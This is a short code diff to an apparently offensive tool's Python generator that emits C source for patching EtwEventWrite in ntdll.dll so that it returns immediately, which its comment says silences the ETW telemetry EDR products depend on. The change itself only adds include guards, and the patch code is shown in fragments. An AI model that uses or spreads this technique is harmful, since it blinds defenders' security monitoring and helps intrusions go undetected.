@@ -30,6 +30,9 @@ def generate_etw_patch() -> Dict[str, Any]:
 // Patches EtwEventWrite in ntdll.dll with: xor eax,eax; ret
 // This silences ETW telemetry collection used by EDR products.
 
+#ifndef PHANTOM_PATCH_ETW_INCLUDED
+#define PHANTOM_PATCH_ETW_INCLUDED
+
 #include <windows.h>
 
 static BOOL patch_etw_event_write(void) {
@@ -56,6 +59,8 @@ static BOOL patch_etw_event_write(void) {
                           (LPVOID)pEtwEventWrite, sizeof(patch));
     return TRUE;
 }
+
+#endif /* PHANTOM_PATCH_ETW_INCLUDED */
 """
 
     return {
